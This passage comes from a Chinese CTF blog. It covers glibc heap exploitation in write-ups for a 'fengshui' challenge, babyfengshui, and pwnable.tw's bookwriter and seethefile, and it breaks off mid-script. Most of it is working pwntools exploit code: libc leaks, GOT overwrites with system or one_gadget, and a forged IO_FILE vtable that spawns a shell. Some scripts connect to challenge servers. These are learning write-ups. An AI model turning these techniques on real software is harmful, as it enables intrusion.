使用one_gadget的方式获取shell\n\n搜索libc中的可用gadget，挨个试试，最后一个在我的机器上可以成功。\n\n```shell\nbling@bling:~$ one_gadget libc-2.23.so \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n```\n\n- exp如下\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsh_gadget = libc_base + 0xf1147\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"gadget addr: 0x%x\" % sh_gadget)\n\npayload = \"a\" * 0x40 + p64(73) + p64(0) + p64(sh_gadget) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 使用system函数获取shell\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsystem_addr = libc_base + 0x45390\nsh_addr = libc_base + next(mylibc.search(\"/bin/sh\\x00\"))\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"system addr: 0x%x\" % system_addr)\nlog.warn(\"sh addr: 0x%x\" % sh_addr)\n\npayload = \"a\" * 0x40 + p64(73) + p64(sh_addr) + p64(system_addr) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n","categories":["CTF"]},{"title":"babyfengshui","url":"/2020/04/19/babyfengshui/","content":"\n# 1 分析\n\n## 1.1 二进制程序基本信息\n\n```shell\n$ file babyfengshui \nbabyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped\n\n$ checksec babyfengshui \n[*] '/mnt/hgfs/vmshare-1604/babyfengshui/babyfengshui'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n\n```\n\n## 1.2 IDA分析源码流程\n\n程序主要有四个函数：添加用户，删除用户，展示用户信息，升级用户信息。\n\n### 添加用户\n\n```c\n····\nprintf(\"size of description: \");\n__isoc99_scanf(\"%u%c\", &v2, &v0);\nadd_user(v2);\n····\n_DWORD *__cdecl add_user(size_t a1)\n{\n  void *s; // ST24_4\n  _DWORD *v2; // ST28_4\n\n  s = malloc(a1);\n  memset(s, 0, a1);\n  v2 = malloc(0x80u);\n  memset(v2, 0, 0x80u);\n  *v2 = s;\n  ptr[(unsigned __int8)user_num] = v2;\n  printf(\"name: \");\n  get_v1((char *)ptr[(unsigned __int8)user_num] + 4, 0x7C);\n  update_description(++user_num - 1);\n  return v2;\n}\n```\n\n添加用户的代码，做了这么一件事，如下图所示。首先创建一个堆块用来存放description信息，用`*S`指向它；再创建一个堆块，用`*V2`指向它，前四个字节存放description的地址，后面用来存放名字name；最后将bss段的ptr[0]指向`*V2`这个堆块。并将byte_804b069自加1，这个值相当于记录目前一共申请了多少个user。\n\n![](babyfengshui-1.png)\n\n### 删除用户\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndel_user(v2);\n\nunsigned int __cdecl del_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    free(*(void **)ptr[index]);\n    free(ptr[index]);\n    ptr[index] = 0;\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n删除用户的代码中，将一个用户拥有的两个堆块分别释放，并将bss段对应的ptr[n]置0。虽然此时`*V2`的前四个字节还指向`*S`，但当堆块被扔到bin中时，会做清理，因此不会造成问题。\n\n### 展示用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndisp_user(v2);\n\nunsigned int __cdecl disp_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    printf(\"name: %s\\n\", (char *)ptr[index] + 4);\n    printf(\"description: %s\\n\", *(_DWORD *)ptr[index]);\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n这个函数很简单，根据给定的index，将用户的name和description信息打印出来。通过这个函数的功能我们可以猜测，之后泄露信息一定要用到它。\n\n### 升级用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\nupdate_description(v2);\n\nunsigned int __cdecl update_description(unsigned __int8 index)\n{\n  char v2; // [esp+17h] [ebp-11h]\n  int v3; // [esp+18h] [ebp-10h]\n  unsigned int v4; // [esp+1Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    v3 = 0;\n    printf(\"text length: \");\n    __isoc99_scanf(\"%u%c\", &v3, &v2);\n    if ( (char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4 )\n    {\n      puts(\"my l33t defenses cannot be fooled, cya!\");\n      exit(1);\n    }\n    printf(\"text: \");\n    get_v1(*(char **)ptr[index], v3 + 1);\n  }\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n升级用户信息这个函数乍一看没看出问题，就是不太明白`(char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4`这一个判断的作用是啥，以为不会有漏洞点就跳过了。谁知道！！问题就出在这儿！！\n\n这一判断的目的是，保证当前用户的description块不会覆盖name块。如果分配给一个用户的两个堆块是相邻的，且description块在低地址，name块在高地址的话，这个判断是很有用的。但是如果这两个堆块不相邻，那么问题就来了，位于description块和name块之间的所有堆块都可以被我们的输入覆盖。\n\n因此，我们只要构造一个用户，其两个堆块在另一个用户堆块description块和name块之间即可。\n\n### 利用分析\n\n以添加第一个用户为例，需要我们指定description的堆块大小，还会申请一个固定大小0x80的堆块（该堆块被释放后会进入unsorted bin）。如果指定description大小为fast bin的大小，那么当删除这个用户时（非第一个用户，因为第一个用户的堆chunk紧挨着top chunk，释放后会跟top chunk合并而非进入bin中），description块会进入fast bin，而name块会进入unsorted bin（0x80）。\n\n这时，如果我们添加一个用户，并且指定description大小为0x80，那么unsorted bin中的那个块会被分配给这个用户的description，然后再新生成一个0x80大小的chunk给这个用户做name块。因此就构造了如下图所示的两个用户堆块关系：\n\n![](babyfengshui-2.png)\n\n这样我们调用“升级用户信息”函数更改description A的值，使name B的前四个字节被覆盖为got表中的free表项(泄露free地址，我们要用`（1）system替换free（2）将description A的前几个字节改成“/bin/sh\\x00”`，这样在删除用户free(S)时，就去执行了`system(\"/bin/sh\\x00\")`)，这样当我们调用打印信息时，会去打印free这个got表项存放的真正的free函数地址，从而泄露出free函数地址（根据该地址，结合对应的libc版本，我们可以进一步算出libc基址和system函数地址）。\n\n获得system函数地址后，我们调用升级B用户信息，将system地址写入got表中的free表项，从而实现了free函数的劫持。然后在之前往description A中写信息时，将\"/bin/sh\\x00\"写在起始位置。最后，调用删除函数删除用户A的信息，就可以实现get shell利用了。\n\n# 2 exp\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./babyfengshui')\n#myproc = process(myelf.path)\nmyproc = remote(\"159.138.137.79\",65054)\n\ndef add_user(size,name,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(0))\n    myproc.recvuntil(\"size of description: \")\n    myproc.sendline(str(size))\n    myproc.recvuntil(\"name: \")\n    myproc.sendline(name)\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\ndef del_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef disp_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef update_description(user_index,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\nadd_user(0x10,'name0',0x10,'text0')\nadd_user(0x10,'name1',0x10,'text1')\ndel_user(0)\nadd_user(0x80,'name2',0x80,'text2')\n\npayload = \"/bin/sh\\x00\"+\"a\"*(0xa0 - len(\"/bin/sh\\x00\")) + p32(myelf.got['free'])\nupdate_description(2,len(payload),payload)\ndisp_user(1)\nmyproc.recvuntil('description: ')\nfree_addr = u32(myproc.recv(4))\n\nlibc_base = free_addr - 0x070750\nsystem_addr =  libc_base + 0x03a940\n\n# 将free函数的got表项写成system函数地址\nupdate_description(1,4,p32(system_addr))\n\ndel_user(2)\n#gdb.attach(myproc)\n\nmyproc.interactive()\n```\n\n# 3 libc版本\n\n根据泄露的函数地址的后三位可以确定对应的libc版本，具体操作见如下链接。\n\n参考链接：\nhttps://www.jianshu.com/p/8d2552b8e1a2\nhttps://libc.blukat.me/\n\n# 4 题目参考链接\n\nhttps://blog.csdn.net/Breeze_CAT/article/details/103788631\n","tags":["heap","堆风水"],"categories":["CTF"]},{"title":"pwnable.tw之bookwriter","url":"/2020/04/04/bookwriter/","content":"\n[题目链接](https://pwnable.tw/challenge/#24)\n\n参考wp：\n\n[【PWNABLE.TW】 BookWriter 解题思路](http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/)\n\n[Pwnable.tw之BookWriter](https://bbs.pediy.com/thread-226694.htm)\n\n# 1 分析\n\n查看二进制各项属性：\n\n```shell\n$ file bookwriter\nbookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped\n$ checksec bookwriter \n[*] '/mnt/hgfs/vmshare-1604/bookwriter/bookwriter'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n\n```\n\n- 64位二进制程序，动态链接，去了符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化未开启\n\n使用IDA分析二进制源码逻辑，存在四个功能，分别是：\n\n- add：添加page和内容\n- view：查看page的内容\n- edit：更改page的内容，并重新调整大小值size\n- information：显示作者姓名\n\n漏洞点有以下几个：\n\n- 未进入while循环前输入作者姓名时，结束符控制有问题。导致后续打印该字符串时可越界读。\n- add函数中的if(i>8)判断有误，导致bss段原本存放size的位置可被覆盖为堆地址\n- edit函数中同样存在第一个问题，在输入字符串时，结束符控制有问题，导致计算strlen时产生一个大于原本字符串的值，后续可以越界写。\n\n# 2 利用\n\n## 2.1 泄露堆地址和libc基址\n\n泄露堆地址和libc测试代码：\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n#获取unsorted bin中第一个bin的top值\n    myproc.recvuntil(\"yuan\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n#获取.bss段中author_name相邻的page指针，即堆地址\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n    \n#泄露堆地址\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")     #构造64字节name，后续打印name会越界打印出堆地址\nadd_page(0x18,\"b\"*0x18)      \nedit_page(0,\"c\"*0x18)    #计算size的时候会把top chunk的size字段也算进去，导致下一步可以多写3字节\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")    #将page0的内容改为空，则page0的size字段为空，可绕过add_page中对page[8]的检查。最后三个字节更改top chunk的大小，使其进入unsorted bin中，从而泄露top地址\nheap_addr = information(0,0)    #获取page[0]上的堆地址\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\n#泄露libc\nfor i in range(0,8):\n    add_page(0x64,\"a\"*4+\"yuan\")\ntop_addr = view_page(3)      # 除了第一个从unsorted bin中分配的堆块，无法获得top地址，其他都可\nlog.warn(\"top_addr: 0x%x\" % top_addr)\nlibc_base = top_addr - 0x58 - 0x3c3b20    #通过top地址，计算libc基址。0x58可以在堆调试中看到,0x3c3b20是查看libc.so中malloc_trim函数中变量的偏移获取到的。\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n## 2.2 get shell\n\n通过以上代码，已经可以实现往第0个堆上写超长数据，从而覆盖堆空间其他部分了。\n\n现在还需要解决几个问题：\n\n（1）通过unsortedbin attack将IO_list_all覆盖为我们可写的内存地址，从而伪造IO_FILE_plus结构体\n\n问题1：但是通过unsortedbin attack只能将IO_list_all覆盖为mainarena+0x58（64位），该空间是我们不可控的，且空间的条件内不满足执行_IO_OVERFLOW，因此会转去寻找chain这个地址。\n\n（2）此时chain的位置正好是small bin的区域，因此我们需要构造一个能控制的small bin chunk\n\n问题2：怎么获得这个可控制的small bin chunk呢？将unsorted bin chunk中的chunk大小改一下，改成small bin大小，这样从unsorted bin中拆下的chunk就会被链接到对应大小的small bin上。\n\n问题3：这个大小应该多大呢？根据（1）中chain的位置来确定，本题是0x60。\n\n### unsorted bin attack\n\n参考ctf-wiki：[unsorted bin attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)\n\n利用该方法可以往任意地址写一个固定的值。本题中可以将main_arena+0x58的地址写到IO_list_all上（将IO_list_all - 0x10的地址放在unsorted chunk的bk处），从而将IO_FILE_plus转移。由于main_arena不满足条件，会继续转移。IO_FILE中chain的位置正好在0x60大小small bin的bk处。如下图，构造一个0x60大小的unsorted bin，malloc时会将该unsorted bin放到chunk(IO_FILE)位置。而unsorted bin chunk的大部分区域我们都可以通过堆溢出来任意写。\n\n![](bookwriter-1.png)\n\n### I/O FILE\n\n以上分析可知，我们现在需要在unsorted bin chunk里布局IO_FILE_plus结构体，有一些限制条件，在参考链接中有提及，这里不复述。因此，通过堆溢出在第0号堆块上布局如下：\n\n![](bookwriter-2.png)\n\n按照如上构造后，在gef中调试打印如下：\n\n```shell\ngef➤  heap chunks\nChunk(addr=0x1c91010, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c91010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\ngef➤  x/50gx 0x1c91010+0x390\n0x1c913a0:\t0x0068732f6e69622f\t0x0000000000000061\n0x1c913b0:\t0x0000000000000000\t0x00007f9ecc967510\n0x1c913c0:\t0x0000000000000002\t0x0000000000000003\n0x1c913d0:\t0x0000000000000000\t0x0000000000000000\n0x1c913e0:\t0x0000000000000000\t0x0000000000000000\n0x1c913f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91400:\t0x0000000000000000\t0x0000000000000000\n0x1c91410:\t0x0000000000000000\t0x0000000000000000\n0x1c91420:\t0x0000000000000000\t0x0000000000000000\n0x1c91430:\t0x0000000000000000\t0x0000000000000000\n0x1c91440:\t0x0000000000000000\t0x0000000000000000\n0x1c91450:\t0x0000000000000000\t0x0000000000000000\n0x1c91460:\t0xffffffffffffffff\t0x0000000000000000\n0x1c91470:\t0x0000000000000000\t0x0000000001c91480\n0x1c91480:\t0x0000000000000000\t0x0000000000000000\n0x1c91490:\t0x0000000000000001\t0x00007f9ecc5e7390\n0x1c914a0:\t0x0000000000000000\t0x0000000000000000\n0x1c914b0:\t0x0000000000000000\t0x0000000000000000\n0x1c914c0:\t0x0000000000000000\t0x0000000000000000\n0x1c914d0:\t0x0000000000000000\t0x0000000000000000\n0x1c914e0:\t0x0000000000000000\t0x0000000000000000\n0x1c914f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91500:\t0x0000000000000000\t0x0000000000000000\n0x1c91510:\t0x0000000000000000\t0x0000000000000000\n0x1c91520:\t0x0000000000000000\t0x0000000000000000\ngef➤  p *(struct _IO_FILE_plus*)0x1c913a0\n$1 = {\n  file = {\n    _flags = 0x6e69622f, \n    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, \n    _IO_read_end = 0x0, \n    _IO_read_base = 0x7f9ecc967510 \"\", \n    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, \n    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, \n    _IO_write_end = 0x0, \n    _IO_buf_base = 0x0, \n    _IO_buf_end = 0x0, \n    _IO_save_base = 0x0, \n    _IO_backup_base = 0x0, \n    _IO_save_end = 0x0, \n    _markers = 0x0, \n    _chain = 0x0, \n    _fileno = 0x0, \n    _flags2 = 0x0, \n    _old_offset = 0x0, \n    _cur_column = 0x0, \n    _vtable_offset = 0x0, \n    _shortbuf = \"\", \n    _lock = 0x0, \n    _offset = 0x0, \n    _codecvt = 0x0, \n    _wide_data = 0x0, \n    _freeres_list = 0x0, \n    _freeres_buf = 0x0, \n    __pad5 = 0x0, \n    _mode = 0xffffffff, \n    _unused2 = \"\\377\\377\\377\\377\", '\\000' <repeats 15 times>\n  }, \n  vtable = 0x1c91480\n}\ngef➤  p *(struct _IO_jump_t*)0x1c91480\n$2 = {\n  __dummy = 0x0, \n  __dummy2 = 0x0, \n  __finish = 0x1, \n  __overflow = 0x7f9ecc5e7390 <__libc_system>, \n  __underflow = 0x0, \n  __uflow = 0x0, \n  __pbackfail = 0x0, \n  __xsputn = 0x0, \n  __xsgetn = 0x0, \n  __seekoff = 0x0, \n  __seekpos = 0x0, \n  __setbuf = 0x0, \n  __sync = 0x0, \n  __doallocate = 0x0, \n  __read = 0x0, \n  __write = 0x0, \n  __seek = 0x0, \n  __close = 0x0, \n  __stat = 0x0, \n  __showmanyc = 0x0, \n  __imbue = 0x0\n}\n```\n\n# 3 EXP\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=remote(\"chall.pwnable.tw\",10304)\n#myproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#mylibc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')\n#myproc=process(myelf.path)\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.recvuntil(\"aaaaaaaa\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")\nadd_page(0x18,\"b\"*0x18)\nedit_page(0,\"c\"*0x18)\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")\nheap_addr = information(0,0)\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\nfor i in range(0,8):\n    add_page(0x64,\"a\"*8)\n\ntop_addr = view_page(3)\nlog.warn(\"top_addr: 0x%x\" % top_addr)\n#yuancheng\nlibc_base = top_addr - 0x58 - 0x3c3b20\n#bendi\n#libc_base = top_addr - 0x58 - 0x3c4b20\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\nfakefile = \"/bin/sh\\0\" + p64(0x61) + p64(0) + p64(libc_base + mylibc.symbols['_IO_list_all']-0x10) + p64(2) + p64(3)\nfakefile += \"\\x00\"*0x90 + p64(0xffffffffffffffff) + \"\\x00\"*0x10 \nfakefile += p64(heap_addr + 0x390 + 0xe0)\n\nvtable = p64(0) + p64(0) + p64(1) + p64(libc_base + mylibc.symbols[\"system\"])\n\npayload = \"\\x00\"*0x390 + fakefile + vtable\nedit_page(0,payload)\n\nmyproc.recvuntil(\"Your choice :\")\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"Size of page :\")\nmyproc.sendline(str(0x10))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之seethefile","url":"/2020/03/29/seethefile/","content":"\n[题目链接](https://pwnable.tw/challenge/#9)\n\n# 1 分析\n\n```shell\n$ file seethefile \nseethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped\n$ checksec seethefile\n[*] '/mnt/hgfs/vmshare-1604/seethefile/seethefile'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n- 32位二进制可执行程序\n- 动态链接\n- got表可读可写\n- 栈不可执行，未开栈canary\n- 未随机化\n\n程序一共实现了五个功能：\n\n- open：打开文件\n\n- read：读文件\n\n- write to screen：将读取的内容打印到屏幕\n\n- close：关闭文件\n- exit：退出\n\n所有操作都是针对如下几个bss段的全局变量：\n\n- char filename[64]\n- char magicbuf[416]\n- name，占0x20个字节\n- FILE *fp\n\nopenfile读取字符串到filename[64]处，如果文件名不包含“flag”字符串就打开这个文件，并将文件描述符指针关联到bss段的FILE *fp。\n\nreadfile将打开文件的内容读取到magicbuf[416]。\n\nwrite to screen将magicbuf[416]中的内容打印到屏幕上。（filename不能包含“flag”，内容中不能包含\"FLAG\"或\"}\"）\n\nclose将打开的文件关闭。\n\nexit退出前会读取一段字符串到bss段的name处，然后判断fp是否为空，若不为空就fslose(fp)。如下代码：\n\n```c\n      case 5:\n        printf(\"Leave your name :\");\n        __isoc99_scanf(\"%s\", &name);\n        printf(\"Thank you %s ,see you next time\\n\", &name);\n        if ( fp )\n          fclose(fp);\n        exit(0);\n        return;\n```\n\n漏洞点：name和fp相邻，name处在低地址，fp处在高地址。scanf未限制name输入的字符串大小，导致溢出覆盖fp指针。\n\n触发代码：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\n#mylibc = 